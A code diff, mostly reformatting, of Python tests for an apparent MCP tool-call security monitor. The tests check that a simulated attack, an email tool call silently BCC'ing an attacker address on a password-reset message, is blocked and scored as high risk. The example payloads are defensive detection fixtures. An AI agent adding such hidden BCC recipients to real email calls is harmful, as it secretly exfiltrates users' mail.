@@ -142,9 +142,7 @@ class TestDetectorsCrossPlatform:
 
     def test_exfiltration_bcc_detected(self):
         d = ExfiltrationDetector()
-        detected, reasons = d.detect(
-            "email.send", {"to": "x@y.com", "bcc": ["attacker@evil.com"]}
-        )
+        detected, reasons = d.detect("email.send", {"to": "x@y.com", "bcc": ["attacker@evil.com"]})
         assert detected
         assert any("BCC" in r for r in reasons)
 
@@ -159,16 +157,18 @@ class TestFullPostmarkAttackSimulation:
         monitor.shadow_detector.register_server("postmark", ["send"])
 
         # The attack: silent BCC to attacker
-        result = monitor.inspect_call({
-            "name": "send.email",
-            "server_id": "postmark",
-            "arguments": {
-                "to": ["employee@company.com"],
-                "subject": "Password Reset",
-                "body": "Click here to reset.",
-                "bcc": ["phan@giftshop.club"],
-            },
-        })
+        result = monitor.inspect_call(
+            {
+                "name": "send.email",
+                "server_id": "postmark",
+                "arguments": {
+                    "to": ["employee@company.com"],
+                    "subject": "Password Reset",
+                    "body": "Click here to reset.",
+                    "bcc": ["phan@giftshop.club"],
+                },
+            }
+        )
 
         assert result["allowed"] is False
         assert result["risk_score"] >= 70
@@ -181,15 +181,17 @@ class TestFullPostmarkAttackSimulation:
         monitor = MCPSecurityMonitor({"postmark"}, audit)
         monitor.shadow_detector.register_server("postmark", ["send"])
 
-        result = monitor.inspect_call({
-            "name": "send.message",
-            "server_id": "postmark",
-            "arguments": {
-                "to": ["user@company.com"],
-                "subject": "Meeting Tomorrow",
-                "body": "See you at 3pm.",
-            },
-        })
+        result = monitor.inspect_call(
+            {
+                "name": "send.message",
+                "server_id": "postmark",
+                "arguments": {
+                    "to": ["user@company.com"],
+                    "subject": "Meeting Tomorrow",
+                    "body": "See you at 3pm.",
+                },
+            }
+        )
 
         # PII detector will flag the email address in 'to' (correct behavior)
         # But there should be NO exfiltration finding (no BCC)
@@ -213,12 +215,15 @@ class TestEdgeCases:
 
     def test_special_json_characters(self, tmp_path):
         log = AuditLog(str(tmp_path / "special.log"))
-        log.append("special", {
-            "quote": 'He said "hello"',
-            "backslash": "C:\\Users\\dev",
-            "newline": "line1\nline2",
-            "tab": "col1\tcol2",
-        })
+        log.append(
+            "special",
+            {
+                "quote": 'He said "hello"',
+                "backslash": "C:\\Users\\dev",
+                "newline": "line1\nline2",
+                "tab": "col1\tcol2",
+            },
+        )
         log2 = AuditLog(str(tmp_path / "special.log"))
         assert log2.entries[0].data["backslash"] == "C:\\Users\\dev"
         assert log2.entries[0].data["newline"] == "line1\nline2"
